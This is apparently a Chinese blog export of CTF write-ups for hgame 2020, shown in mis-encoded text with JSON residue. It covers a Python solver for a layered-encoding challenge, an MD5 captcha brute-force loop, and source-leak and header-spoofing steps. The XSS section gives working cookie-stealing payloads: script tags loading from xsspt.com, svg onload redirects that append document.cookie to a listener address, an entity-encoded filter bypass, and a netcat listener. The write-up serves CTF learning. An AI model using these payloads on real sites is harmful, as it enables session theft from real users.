é¦–å…ˆè¿™é‡Œå…ˆæƒè¡¡ä¸‹è„šæœ¬çš„ä¹¦å†™æ–¹å¼ã€‚å¼€å§‹æˆ‘æ˜¯æƒ³ç”¨phpè„šæœ¬çš„ã€‚ä½†æ˜¯æˆ‘ä¸ä¼šphpä¸­ä¸pythoné‡Œrequestsåº“æœ‰ç›¸åŒåŠŸèƒ½çš„çŸ¥è¯†ï¼Œé‚£å°±åªèƒ½ç”¨pythonè„šæœ¬äº†ã€‚ä½†éšä¹‹è€Œæ¥çš„é—®é¢˜æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦æŠŠåŠ å¯†çš„å‡½æ•°æ”¹ä¸€æ”¹ï¼Œè€Œä¸”pythoné‡Œè¿˜æ²¡æ‰¾åˆ°rot-13decodeçš„åº“â€¦â€¦ï¼ˆæˆ‘å°±æ˜¯å› ä¸ºæ‰¾äº†ä¸ªé”™çš„rot-13è§£ç è„šæœ¬å¯¼è‡´ç™½èŠ±äº†å¿«ä¸€ä¸ªå°æ—¶ï¼‰ æ‰€ä»¥æˆ‘çš„æ€è·¯æ˜¯è¿™æ ·çš„ï¼Œè¯·æ±‚ä¸¤ä¸ªé¡µé¢ï¼Œåˆ†åˆ«ç”¨æ­£åˆ™æ‹¿åˆ°å›æ˜¾å†…å®¹ï¼Œä»¥åŠmycodeé‡Œ10ä¸ªåŠ å¯†å‡½æ•°ç»„æˆçš„å­—ç¬¦ä¸²ã€‚æˆ‘å†å¦å†™ä¸€ä¸ªå‡½æ•°åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ¯åŒ¹é…åˆ°ä¸€ä¸ªå‡½æ•°åå­—ç¬¦ä¸²æ‰§è¡Œå¯¹åº”çš„è§£å¯†å‡½æ•°ã€‚ï¼ˆç¨å¾®è§£é‡Šä¸‹ï¼Œå› ä¸ºè‡ªå·±ä¸€å¼€å§‹å¼„åäº†ã€‚æˆ‘ä»¬è§£å¯†æ˜¯è¦å¯¹å›æ˜¾å†…å®¹ä»å¤–å‘é‡Œè§£ï¼Œæ•…è°ƒç”¨çš„å‡½æ•°é¡ºåºä¸æˆ‘ä»¬ä»mycodeé‡Œè·å¾—åŠ å¯†å‡½æ•°å­—ç¬¦ä¸²ä¸­å‡½æ•°çš„é¡ºåºæ˜¯ä¸€è‡´çš„ã€‚æ¯”å¦‚åŠ å¯†æ–¹å¼ï¼š 1$å¯†ç &#x3D;base64_encode(str_rot13(strrev($åŸç ))) æˆ‘ä»¬éœ€è¦ï¼š 1echo(strrev(str_rot13(base64_decode($å¯†ç )))) æ¥å¾—åˆ°åŸç ã€‚ä½†æˆ‘å°è£…å¥½çš„åŒ¹é…å‡½æ•°çš„è°ƒç”¨é¡ºåºä»æ˜¯ 1base64_decode , str_rot13(), strrev() è¢«è‡ªå·±ä¸€å¼€å§‹çš„phpè„šæœ¬çš„å›ºåŒ–å°è±¡å½±å“ï¼Œå¼„åäº†é¡ºåºå¯¼è‡´è€æ˜¯æŠ¥é”™ã€‚ä¸å¤ªåº”è¯¥ã€‚è¯ä¸å¤šè¯´ï¼Œè´´è„šæœ¬ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import requestsimport reimport base64def str_rot13(s, OffSet=13): def encodeCh(ch): f = lambda x: chr((ord(ch) - x + OffSet) % 26 + x) return f(97) if ch.islower() else (f(65) if ch.isupper() else ch) return ''.join(encodeCh(c) for c in s)def strrev(str): return str[::-1]def decrypt(str): res='' for i in range(0,len(str)): res+= chr(ord(str[i]) - 1) return resdef exec(string,token): if string=='encrypt': return decrypt(token) if string=='str_rot13': return str_rot13(token) if string=='base64_encode': f=str(base64.b64decode(token),'utf-8') return f if string=='strrev': return strrev(token)url='http://76c59cdfab.php.hgame.n3ko.co'url1='http://76c59cdfab.php.hgame.n3ko.co/mycode'res=requests.get(url)res1=requests.get(url1)key=re.findall(r'(.*)&lt;br&gt;',res.text)[2]#print(key)key1=re.findall(r'echo\\((.*)\\$',res1.text)[0]#print(key1)key1=key1.replace('(','&lt;br&gt;')#print(key1)token=keyprint('\\n')for i in range(0, 10): text = re.findall(r'(.*?)&lt;br&gt;', key1)[i] token=exec(text,token)print(token)data=&#123; 'token':token&#125;flag=requests.post(url=url,data=data)print(flag.text) å…¶ä¸­ä¸ºäº†æ–¹ä¾¿ï¼ŒæŠŠå‡ ä¸ªè§£å¯†å‡½æ•°é‡æ–°å°è£…ä¸€ä¸‹ã€‚decrypt()å¾ˆå¥½å†™ï¼Œstr_rot13()ä»ç½‘ä¸Šå«–çš„ã€‚exec()å°±æ˜¯ç”¨äºåŒ¹é…å­—ç¬¦ä¸²å¹¶æ‰§è¡Œçš„å‡½æ•°ï¼Œæ³¨æ„å…¶ä¸­çš„base64è¦è½¬å­—ç¬¦ä¸²å½¢å¼ï¼Œä¸ç„¶è§£å‡ºæ¥æ˜¯äºŒè¿›åˆ¶dataï¼›ä¹‹åçš„keyä¸key1åˆ†åˆ«ç”¨äºè·å–è¯·æ±‚çš„å†…å®¹ä¸­æˆ‘ä»¬è¦åˆ©ç”¨çš„å›æ˜¾ä¸å‡½æ•°éƒ¨åˆ†ã€‚è¿™é‡Œéœ€è¦è‡ªå·±è°ƒæ•´ä¸€ä¸‹,æ¯”å¦‚ï¼š 1key&#x3D;re.findall(r&#39;(.*)&lt;br&gt;&#39;,res.text)[2] æˆ‘ç”¨reçš„findall()å‡½æ•°ï¼Œç”±äºè¿”å›çš„æ˜¯åˆ—è¡¨æ•…è¦è®°å¾—æ ¹æ®res.textè°ƒæ•´å¯¹åº”çš„ä¸‹æ ‡ã€‚ä¹‹åæˆ‘ä¹Ÿç”¨æ­£åˆ™å‡½æ•°ï¼ŒåŒ¹é…å‡ºå‡½æ•°å­—ç¬¦ä¸²ï¼Œå»æ‰æ‹¬å·éƒ¨åˆ†ï¼Œå¹¶åœ¨ä¹‹åè°ƒç”¨exec()å‡½æ•°æ—¶ï¼Œå†æ¬¡åˆ©ç”¨findall()çš„åŒ¹é…å¾—åˆ°å‡½æ•°åç»„æˆçš„åˆ—è¡¨ï¼Œä¾æ¬¡è°ƒç”¨ã€‚æœ€åè§£å‡ºtokenï¼Œpostè¯·æ±‚æ‹¿åˆ°flagã€‚ä»flagä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬ä¹Ÿèƒ½ç”¨phpè„šæœ¬â€¦â€¦ç„¶è€Œæˆ‘tclè€Œä¸ä¼šï¼Œä¸ç„¶å¯ä»¥çœæ‰ä¸å°‘æ—¶é—´ã€‚ Cosmosçš„èŠå¤©å®¤ èŠ±äº†æœ€é•¿æ—¶é—´çš„ä¸€é“é¢˜â€¦â€¦ä½†æ¯•ç«Ÿæ˜¯å¯¹æˆ‘æ¥è¯´æœ€éš¾çš„ä¸€é“äº†ï¼Œåšçš„éå¸¸è¾›è‹¦ä½†æ˜¯åˆæœ‰è®¸å¤šæ”¶è·ã€‚æ‰€ä»¥å°±ç€é‡ç¬”å¢¨å¤šè®°å½•ä¸‹è¿™é“é¢˜ï¼Œé¡ºä¾¿å½“è‡ªå·±çš„å­¦ä¹ ç¬”è®°å¥½äº†ã€‚ è¿›å…¥ç•Œé¢ é¦–å…ˆå½“ç„¶æ˜¯åˆ¤æ–­æ¼æ´ç±»å‹äº†ã€‚ä»é¢˜ç›®åå­—å¯ä»¥çŸ¥é“ï¼Œå¯èƒ½æ˜¯ä¸ªå‰ç«¯æ¼æ´ã€‚ç”±äºç•Œé¢å¼€å§‹å°±æä¾›äº†ä¸€ä¸ªFlag is hereçš„buttonã€‚ç‚¹å‡»è¿›å»åå‘ç°æç¤ºè¿™é‡Œç›´æ¥è¯´æ˜æˆ‘ä»¬éœ€è¦adminçš„tokenæ‰èƒ½æ‹¿åˆ°flagã€‚å¥½çš„ï¼Œå‰ç«¯+tokenï¼Œåº”è¯¥ä¸éš¾æƒ³åˆ°éœ€è¦æˆ‘ä»¬é€šè¿‡xssæ‰“åˆ°adminçš„cookieæ¥è·å–tokenäº†ã€‚ç„¶åæ•´ç†ä¸‹æ€è·¯ï¼Œå¤§æ¦‚æ˜¯å¦‚æ­¤:é€šè¿‡messageæäº¤payloadã€‚ç„¶åä¸‹é¢ä¸€ä¸ªéªŒè¯ç codeç”¨è„šæœ¬è·‘å‡ºæ¥ã€‚æ¯æ¬¡ç‚¹å‡»â€™æäº¤â€™æ—¶ï¼Œå°±ä¼šæŠŠä¹‹å‰ä¼ è¿‡çš„æ‰€æœ‰messageéƒ½å‘ç»™botã€‚botè‡ªç„¶æ˜¯å¸¦æœ‰adminæƒé™çš„äº†ï¼Œé‚£ä¹ˆå®ƒè®¿é—®æ—¶è§¦å‘æˆ‘ä»¬çš„payload,æˆ‘ä»¬æ‹¿åˆ°tokenå°±å¯ä»¥è®¿é—®/flagäº†ã€‚ ä¸‹é¢çš„éªŒè¯æ–¹å¼å¹¶ä¸éš¾ï¼Œåªæ˜¯ä¼šå¼ºè¡Œè€—æ—¶é—´ã€‚é€šå¸¸ç”¨è„šæœ¬è·‘å‡ºæ¥éƒ½æ˜¯7,8ä½æ•°ã€‚ 12345678import hashlibfor i in range(1,999999999): code=hashlib.md5(str(i).encode('utf-8')).hexdigest() print(code[:6]) if code[:6]=='bfa9a6': print(i) break ä½†æ˜¯messageçš„å¤„ç†å°±ä¸ç®€å•äº†ã€‚ç®€å•çš„fuzzåä¼šå‘ç°å­˜åœ¨è¿‡æ»¤ä¸ç‰¹æ®Šå¤„ç†ã€‚è¿™ç‚¹ä¹‹åå†è¯´ã€‚å¥½åœ¨é¢˜ç›®è¯´æ˜äº†ï¼Œç­‰æˆ‘ä»¬æµ‹è¯•æˆåŠŸåå†æäº¤éªŒè¯ç ã€‚è¿™æ ·æ‰€æœ‰å†…å®¹éƒ½èƒ½äº¤åˆ°adminbotæ‰‹ä¸Šï¼Œä¸è‡³äºç‹‚è·‘è„šæœ¬æµªè´¹æ—¶é—´ã€‚ å…¶å®è‡ªå·±åœ¨è¿™é“é¢˜ä¹‹å‰å¹¶æ²¡æœ‰çœŸæ­£æ„ä¹‰ä¸Šåšè¿‡xssæ‰“cookieç±»å‹çš„é¢˜ç›®ã€‚å¤´ä¸€æ¬¡å¬è¯´æ˜¯åœ¨æ ¡èµ›ä¸Šä¸€é“simple_xssçš„é¢˜ç›®ã€‚é‚£é“é¢˜å°±æ˜¯ç®€å•çš„è¿‡æ»¤ä¸‹ç”¨xssæ‰“cookieï¼ˆå½“æ—¶é¢˜ç›®å‡ºäº†ä¸å°‘bugï¼Œç”šè‡³æºç æ³„éœ²ç›´æ¥æ‹¿flagéƒ½è¡Œâ€¦â€¦ï¼‰ã€‚ä¸è¿‡æˆ‘åªçŸ¥é“æœ€åŸºç¡€çš„xsspayloadï¼Œæ ¹æœ¬ä¸ä¼šåˆ©ç”¨xssæ‰“cookieã€‚äºæ˜¯è‡ªå·±å…ˆé€‰æ‹©ç™¾åº¦+googleï¼Œå¾—çŸ¥éœ€è¦xsså¹³å°ã€‚æˆ‘ç”¨çš„è¿™ä¸ªåœ¨çº¿ç½‘ç«™ï¼šhttp://xsspt.com/äºæ˜¯æ˜ç™½ï¼Œå…¶å®å°±æ˜¯åœ¨xsså¹³å°åˆ›å»ºä¸€ä¸ªé¡¹ç›®ï¼Œæ·»åŠ é»˜è®¤æ¨¡æ¿ä»¥åŠxss.jsæ¨¡æ¿,ä¹‹ååªè¦åœ¨xssæ¼æ´å¤„å°è¯•å¹³å°æä¾›ç»™æˆ‘ä»¬çš„payloadå³å¯ã€‚æ¯”å¦‚ï¼šå³å¯æ‰§è¡Œxssæ‰“cookieã€‚ä¸Šé¢é¡¹ç›®å‡ ä¸ªè®°å½•éƒ½æ˜¯æˆ‘åœ¨æœ¬åœ°çš„DVWAä¸Šç”¨xss-reflectedè¿™ä¸ªæ¼æ´çš„lowçº§åˆ«çš„è¾“å…¥æ‰“çš„ã€‚ åŒæ—¶ä¹Ÿæ³¨æ„åˆ°å‡ ç‚¹ï¼Œä»¥ä¸ŠpayloadåŸºæœ¬ä¸Šæ˜¯è¿™æ ·å‡ ä¸ªå½¢å¼ 123451.&lt;script src&#x3D;http:&#x2F;&#x2F;xsspt.com&#x2F;mlRJMn&gt;&lt;&#x2F;script&gt;2.&lt;img src&#x3D;x onerror&#x3D;eval(atob(&#39;cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8veHNzcHQuY29tL21sUkpNbj8nK01hdGgucmFuZG9tKCk&#x3D;&#39;))&gt;3.javascript:eval(&#39;window.s&#x3D;document.createElement(&quot;script&quot;);window.s.src&#x3D;&quot;&#x2F;&#x2F;xsspt.com&#x2F;mlRJMn&quot;;document.body.appendChild(window.s)&#39;) æˆ‘åˆ†ä¹‹ä¸º3ç§ï¼š1.&lt;script&gt;æ ‡ç­¾çš„ç»å…¸payloadã€‚srcå±æ€§æ˜¯å¤–éƒ¨å¼•ç”¨2.&lt;img&gt;æ ‡ç­¾çš„onerrorå±æ€§ï¼Œä¹Ÿæ˜¯ä¸€ç§ç»å…¸payloadã€‚åŒæ—¶ç”¨ä¸Ševal(atob())å¤„ç†base64å­—ç¬¦ä¸²æ¥bypassã€‚è¿˜åŸä¸‹æ˜¯è¿™æ ·çš„ï¼š 1s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;http:&#x2F;&#x2F;xsspt.com&#x2F;mlRJMn?&#39;+Math.random() 3.ä»¥åŠç¬¬ä¸‰ç§javascriptä¼ªåè®®ã€‚æœ‰æ•ˆé¿å…äº†å°–æ‹¬å·çš„å­˜åœ¨ã€‚ä¸Šé¢1,2ä¸¤ç§payloadæˆ‘éƒ½ç”¨DVWAæ‰“åˆ°cookieäº†ã€‚ç¬¬ä¸‰ç§ä¸è¡Œã€‚ å›åˆ°é¢˜ç›®ä¸­æ¥ï¼Œè¿™é“é¢˜ç›®çš„è¿‡æ»¤æ¯”æƒ³è±¡ä¸­ä¸¥æ ¼çš„å¤šã€‚æˆ‘æŠŠåšé¢˜æ—¶çš„FUZZç»“æœè´´ä¸‹ï¼š 1231.scriptå…³é”®å­—è¢«è½¬ä¸º Hi there!2.è¾“å…¥å†…å®¹è½¬ä¸ºå¤§å†™3.æ ‡ç­¾æ•´ä½“è¿‡æ»¤&lt;&gt; ç¬¬ä¸€ç‚¹è¿˜å¥½ï¼Œscriptè¿‡æ»¤äº†è¿˜æœ‰è¯¸å¦‚img,svg/onloadç­‰ç­‰payloadã€‚ç¬¬äºŒç‚¹æœ‰ç‚¹éš¾åŠï¼Œå› ä¸ºé€šå¸¸æ ‡ç­¾åŒ…æ‹¬å±æ€§å¤§å†™åä»ç„¶èƒ½æ­£å¸¸å¤„ç†ï¼ˆå¤§å†™ç»•è¿‡æ˜¯ä¸€ç§å¸¸è§çš„ç»•è¿‡scriptçš„æ–¹æ³•ï¼‰ï¼Œä½†æ˜¯è¿å±æ€§çš„å€¼éƒ½å¤§å†™ä¼šä¸¥é‡å½±å“æˆ‘çš„payloadæ­£å¸¸æ‰§è¡Œã€‚æ¯”å¦‚ALERT(1)æ˜¯æ²¡æ³•æ‰§è¡Œçš„ã€‚xsså¹³å°ä¸Šç¬¬äºŒç§payloadbase64+eval()ä¹Ÿæ˜¯ä¸è¡Œçš„ã€‚å› ä¸ºå¤§å†™åå‡½æ•°ä¸èƒ½æ­£å¸¸æ‰§è¡Œäº†ï¼Œç¼–ç ä¹Ÿé”™è¯¯äº†ã€‚ç¬¬ä¸‰ç‚¹éå¸¸éš¾åŠï¼Œåªè¦æœ‰æ ‡ç­¾å°±ç»™æ»¤æ‰ã€‚æ²¡æœ‰ä»€ä¹ˆåˆ«çš„ç»•è¿‡æ–¹æ³•ã€‚æ‰€ä»¥xsså¹³å°æä¾›çš„payloadå…¨å†›è¦†æ²¡ï¼Œå¿…é¡»æƒ³ç»•è¿‡æ–¹æ³•ã€‚ è¿™æ—¶æˆ‘æƒ³åˆ°äº†å»å¹´æš‘å‡è‡ªå·±å†™çš„ä¸€ç¯‡æ–‡ç« ã€‚æ˜¯å…³äºxss.meä¸Šçš„xssæŒ‘æˆ˜çš„ã€‚å½“æ—¶åŸºæœ¬ä¸Šä¸€è·¯çœ‹ç€wpåšè¿‡æ¥ï¼Œå¥½å¤šéƒ½æ²¡ä»€ä¹ˆå°è±¡ã€‚ä½†ç°åœ¨å†çœ‹å´å‘ç°äº†æ„å¤–å®è—ï¼šhttps://www.jianshu.com/p/18473e2174f3æ¯”å¦‚è¿˜æœ‰ï¼š æ‰€ä»¥è¿™é‡Œå¯ä»¥ä¸é—­åˆæ ‡ç­¾ï¼Œåˆ©ç”¨å®ä½“ç¼–ç å®Œæˆxssã€‚(æ²¡æƒ³åˆ°è¦é è‡ªå·±çš„æ–‡ç« è§£å†³â€¦â€¦å¥½å˜²è®½å•Š)å¥½çš„ï¼Œè§£å†³äº†å°–æ‹¬å·ä¸å¤§å†™çš„é—®é¢˜åå†è§£å†³ä¸€ä¸‹scriptçš„é—®é¢˜å§ã€‚è¿™é‡Œæˆ‘æ‰¾åˆ°äº†skyå¸ˆå‚…ä¹‹å‰åšçš„xssé¢˜ç›®ä»¥åŠä»–åšå¾€å¹´hgameæ—¶å¯¹xssçš„ç»•è¿‡ã€‚https://skysec.top/2018/08/17/xss-ssrf-redis/https://skysec.top/2019/02/18/2019-Hgame-Web-Week4/ ç¬¬ä¸€é“é¢˜xsséƒ¨åˆ†è¿‡æ»¤äº†è®¸å¤šå…³é”®å­—ï¼Œæ¯”å¦‚scriptä»¥åŠonerrorä½†æ˜¯å¯ä»¥ç”¨ 1&lt;svg/onload=\"document.location='vpsip:port'\"&gt; (è¿™é‡ŒåŒæ—¶ä¹Ÿæé†’æˆ‘ï¼Œä¸ä¸€å®šè¦ç”¨xsså¹³å°ï¼Œç”¨vpsä¸Šçš„ncç›‘å¬ä¹Ÿå¯ä»¥ã€‚)åŒæ—¶ç”¨ä¸‹é¢çš„payloadæ‰“cookie: 1&lt;svg/onload=\"document.location='vpsip:port/?'+document.cookie\"&gt; è¿™é‡Œæ˜¯ç”¨ç½‘é¡µipåçš„å‚æ•°å¸¦å‡ºcookieã€‚çœ‹åˆ°åé¢æˆ‘çš„ç»“æœå°±æ˜ç™½äº†ã€‚åŠ ä¸Šå¸ˆå‚…hgameçš„payloadå…¶ä¸­çš„charcodeéƒ¨åˆ†å…¶å®å°±æ˜¯ 1window.location.href=\"vpsip:port/?s=\"+document.cookie; æ‰€ä»¥æ˜ç™½äº†è·å–cookieçš„payloadæ ¼å¼ã€‚é‚£ä¹ˆå¯¹æ­¤é¢˜ï¼Œæˆ‘ä»¬çš„ç†æƒ³payloadå°±æ˜¯ 1&lt;svg/onload=\"window.location.href=\"ip:7788/?s=\"+document.cookie;\"&gt; è¿™é‡Œæˆ‘å‡ºäºéšç§æŠŠè‡ªå·±çš„ipæ»¤æ‰ï¼Œåªæ˜¾ç¤ºæˆ‘ç›‘å¬çš„æ˜¯7788ç«¯å£ã€‚ é‚£ä¹ˆç¼–ç ï¼Œå»å°–æ‹¬å·åï¼Œæˆ‘ä»¬å®é™…æäº¤çš„payloadä¸ºï¼š(è¿™é‡Œæˆ‘æŠŠipæ¢æˆ127.0.0.1) 1&lt;svg/onload=\"&amp;#x77;&amp;#x69;&amp;#x6e;&amp;#x64;&amp;#x6f;&amp;#x77;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x2e;&amp;#x68;&amp;#x72;&amp;#x65;&amp;#x66;&amp;#x3d;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x31;&amp;#x32;&amp;#x37;&amp;#x2e;&amp;#x30;&amp;#x2e;&amp;#x30;&amp;#x2e;&amp;#x31;&amp;#x3a;&amp;#x37;&amp;#x37;&amp;#x38;&amp;#x38;&amp;#x2f;&amp;#x3f;&amp;#x73;&amp;#x3d;&amp;#x22;&amp;#x2b;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x3b;\" åœ¨é¢˜ç›®ç•Œé¢æäº¤åæˆ‘ä»¬çœ‹çœ‹æœ‰æ²¡æœ‰æˆåŠŸæ’å…¥å¯ä»¥çœ‹åˆ°ï¼Œè™½ç„¶å›æ˜¾æ˜¾ç¤ºçš„ä¸€ä¸ªæ— å†…å®¹çš„æ–¹æ¡†ã€‚ä½†æˆ‘çš„payloadè¢«æˆåŠŸè§£æã€‚åŒæ—¶åœ¨vpsä¸Šç›‘å¬ç«¯å£7788 1nc -lvp 7788 æäº¤è„šæœ¬è·‘å‡ºæ¥çš„codeï¼Œæ”¶åˆ°Successçš„åŒæ—¶æŸ¥çœ‹æœåŠ¡å™¨æˆåŠŸå¸¦å‡ºtokenã€‚é‚£ä¹ˆç”¨bpæ¢tokenè®¿é—®/flagå§ã€‚ è¿™é“é¢˜çœŸçš„èŠ±äº†å¾ˆä¹…ã€‚æ¯•ç«Ÿè‡ªå·±åœ¨æ­¤ä¹‹å‰æ²¡æ¥è§¦è¿‡ä¸€é“xssæ‰“cookieçš„çœŸé¢˜ã€‚ä½†æ˜¯è¿˜æ˜¯é ç€ç½‘ä¸ŠçŸ¥è¯†å­¦åˆ°äº†è®¸å¤šï¼ŒæˆåŠŸæ‹¿åˆ°è‡ªå·±çš„flagã€‚æ‰€ä»¥è¦å¤šå¤šå‘å„ä½dalaoä»¥åŠç™¾åº¦è°·æ­Œå­¦ä¹ å•Šã€‚","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"æ­ç”µhgame-week1","slug":"æ­ç”µhgame-week1","date":"2020-01-30T03:11:17.000Z","updated":"2021-02-18T05:08:33.444Z","comments":true,"path":"2020/01/30/æ­ç”µhgame-week1/","link":"","permalink":"https://www.bycsec.top/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/","excerpt":"èŒæ–°çš„ç¬¬ä¸€æ¬¡hgameå¼€å§‹äº†ã€‚week1çš„éš¾åº¦æ¯”è¾ƒå‹å¥½ï¼Œè‡³å°‘ä»webä¸Šæ¥è¯´æ˜¯è¿™æ ·çš„ï¼Œè‡ªå·±ç›®æ ‡ä¹Ÿä¸é«˜ï¼Œäº‰å–åšåˆ°æ¯ä¸ªweekèƒ½akwebå°±æ»¡è¶³äº†ã€‚è¿™æ¬¡çš„webæ•´ä½“ä¸Šæ¯”è¾ƒç®€å•ï¼Œé™¤äº†æˆ‘è‡ªå·±è¢«å‘åˆ°çš„codeworldï¼ˆä¸­é—´å±…ç„¶è¢«banäº†ip,æˆ‘åªæ˜¯ç”¨è„šæœ¬postäº†ä¸€æ¬¡ ï¼Œæ²¡æ‹¿æ‰«æå™¨æ‰«å•Šå•Šå•Šï¼‰å‰©ä¸‹çš„3é¢˜åŠ èµ·æ¥åŸºæœ¬1å°æ—¶ä»¥å†…å°±èƒ½åšå®Œhhã€‚é™¤æ­¤ä¹‹å¤–è¿˜è¯•äº†è¯•å¯†ç å­¦è·Ÿmiscçš„ç®€å•é¢˜ï¼Œä¹Ÿéƒ½å†™ä¸€å†™è¿‡ç¨‹å§ã€‚ï¼ˆå¦å¤–ä½“ä¼šåˆ°re,pwnçœŸçš„æ˜¯çˆ¸çˆ¸ï¼Œçˆ·çˆ·ï¼Œæ’åé«˜çš„åŸºæœ¬éƒ½æ˜¯äºŒè¿›åˆ¶çš„â€¦â€¦,æˆ‘ä»€ä¹ˆæ—¶å€™æ‰èƒ½å­¦ä¼šäºŒè¿›åˆ¶å•Šï¼‰ çœ‹åˆ°å®˜æ–¹å‘å¸ƒäº†æ‰å‘çš„ï¼Œé‚£å°±è´´ä¸‹å®˜æ–¹çš„ï¼šhttps://github.com/vidar-team/Hgame2020_writeup","text":"èŒæ–°çš„ç¬¬ä¸€æ¬¡hgameå¼€å§‹äº†ã€‚week1çš„éš¾åº¦æ¯”è¾ƒå‹å¥½ï¼Œè‡³å°‘ä»webä¸Šæ¥è¯´æ˜¯è¿™æ ·çš„ï¼Œè‡ªå·±ç›®æ ‡ä¹Ÿä¸é«˜ï¼Œäº‰å–åšåˆ°æ¯ä¸ªweekèƒ½akwebå°±æ»¡è¶³äº†ã€‚è¿™æ¬¡çš„webæ•´ä½“ä¸Šæ¯”è¾ƒç®€å•ï¼Œé™¤äº†æˆ‘è‡ªå·±è¢«å‘åˆ°çš„codeworldï¼ˆä¸­é—´å±…ç„¶è¢«banäº†ip,æˆ‘åªæ˜¯ç”¨è„šæœ¬postäº†ä¸€æ¬¡ ï¼Œæ²¡æ‹¿æ‰«æå™¨æ‰«å•Šå•Šå•Šï¼‰å‰©ä¸‹çš„3é¢˜åŠ èµ·æ¥åŸºæœ¬1å°æ—¶ä»¥å†…å°±èƒ½åšå®Œhhã€‚é™¤æ­¤ä¹‹å¤–è¿˜è¯•äº†è¯•å¯†ç å­¦è·Ÿmiscçš„ç®€å•é¢˜ï¼Œä¹Ÿéƒ½å†™ä¸€å†™è¿‡ç¨‹å§ã€‚ï¼ˆå¦å¤–ä½“ä¼šåˆ°re,pwnçœŸçš„æ˜¯çˆ¸çˆ¸ï¼Œçˆ·çˆ·ï¼Œæ’åé«˜çš„åŸºæœ¬éƒ½æ˜¯äºŒè¿›åˆ¶çš„â€¦â€¦,æˆ‘ä»€ä¹ˆæ—¶å€™æ‰èƒ½å­¦ä¼šäºŒè¿›åˆ¶å•Šï¼‰ çœ‹åˆ°å®˜æ–¹å‘å¸ƒäº†æ‰å‘çš„ï¼Œé‚£å°±è´´ä¸‹å®˜æ–¹çš„ï¼šhttps://github.com/vidar-team/Hgame2020_writeup WEBCosmos çš„åšå®¢æ˜¾ç„¶æç¤ºçš„æ˜¯æºç æ³„éœ²ã€‚é‚£ä¹ˆå°±æœæ–­GitHackèµ°èµ·ã€‚å¯æ˜¯æ‹¿ä¸‹æ¥çš„ç»“æœåªæœ‰index.htmlä¸cssæ–‡ä»¶ã€‚è¿™æ—¶å€™ä¸€å¼€å§‹æˆ‘é™·å…¥äº†é”™è¯¯çš„æƒ³æ³•ï¼Œå…·ä½“å‚è€ƒåŸæ¥ichunqiuä¸Šåšè¿‡çš„â€˜ç™»é™†â€™ä¸€é¢˜ã€‚äºæ˜¯æˆ‘ä½¿ç”¨äº†èƒ½å¤Ÿå›æ»šçš„githackï¼Œåœ¨å®ƒçˆ¬ä¸‹çš„objectsé‡Œä¸€ä¸ªä¸ªæ‰¾ï¼ˆå…·ä½“æ–¹æ³•å¦‚ä¸‹ï¼‰ 1git cat-file -p &#x2F;ä¸¤ä½æ•°&#x2F;æ–‡ä»¶å æŸ¥çœ‹å®Œæ‰€æœ‰objectsä¹Ÿæ²¡æœ‰ä»€ä¹ˆæ”¶è·ï¼Œé™¤äº†å‡ºé¢˜äººçš„githubâ€¦â€¦é‚£ä¹ˆæ˜¯å¦æ˜¯å†å²å›æ»šå‘¢ï¼Ÿä½†ç”¨gitæ‰¾å´åªæ‰¾åˆ°ä¸€ä¸ªç‰ˆæœ¬ï¼Œæ„Ÿè§‰ä¸å¤ªå¯¹åŠ²ã€‚é‚£å°±ä¸Šgithubä¸Šæ‰¾æ‰¾å§â€¦â€¦ç»“æœè¿˜çœŸæœ‰ã€‚ä¸‹é¢çš„ç‰ˆæœ¬ä¸­å°±æœ‰flagçš„base64ç¼–ç  æ¥å¤´éœ¸ç‹é¢˜ç›®ä¸Šæ¥æ²¡å•¥æç¤ºï¼Œé™¤äº†ä¸€å¼ æ¥å¤´éœ¸ç‹çš„å›¾ç‰‡è·Ÿyou need to come from vidar.club è¦è¯´webé‡Œè·Ÿå¤´æœ‰å…³çš„ï¼Œé‚£åªèƒ½æ˜¯æŠ“åŒ…é‡Œå¸¸è§çš„Headeräº†ã€‚åŠ ä¸Šcome from æŸä¸ªç½‘å€ï¼Œä¸éš¾çŸ¥é“å°±æ˜¯http Headerä¸­refererè¿™ä¸ªå±æ€§ã€‚è¿™ä¸ªå±æ€§ä¹‹æ‰€ä»¥æœ‰åï¼Œè·Ÿå®ƒå°†é”™å°±é”™çš„æ‹¼å†™æœ‰å…³ï¼Œæ­£ç¡®æ‹¼å†™æ˜¾ç„¶æ˜¯referrer,è€Œè¿™ä¸ªé”™è¯¯æ‹¼å†™æ˜¯æ—©æœŸè§„èŒƒçš„é”™è¯¯å› ä¸ºå‘åå…¼å®¹é—ç•™è‡³ä»Šçš„ã€‚å…¶ä½œç”¨æ˜¯å‘Šè¯‰æœåŠ¡å™¨æˆ‘ä»¬è®¿é—®è€…æ˜¯ä»å“ªé“¾æ¥è¿‡æ¥çš„ï¼Œä»è€Œè¿›è¡ŒåŒºåˆ«å¤„ç†ã€‚é‚£ä¹ˆå…ˆåŠ refererå¤´ æç¤ºè¦ä»æœ¬åœ°è®¿é—®ï¼Œé‚£å°±æ›´ç†Ÿæ‚‰ä¸è¿‡äº†ï¼Œå› ä¸ºè¿™ç”¨åˆ°å·²ç»çƒ‚ç†Ÿäºå¿ƒçš„XFFå¤´äº†ã€‚å¸¸å¸¸ç”¨äºä¼ªé€ ipã€‚æ‰€ä»¥æˆ‘ä»¬ä»¤XFFå¤´ä¸º127.0.0.1.æç¤ºæ”¹æµè§ˆå™¨ï¼Œé‚£åªéœ€æ”¹User-Agent 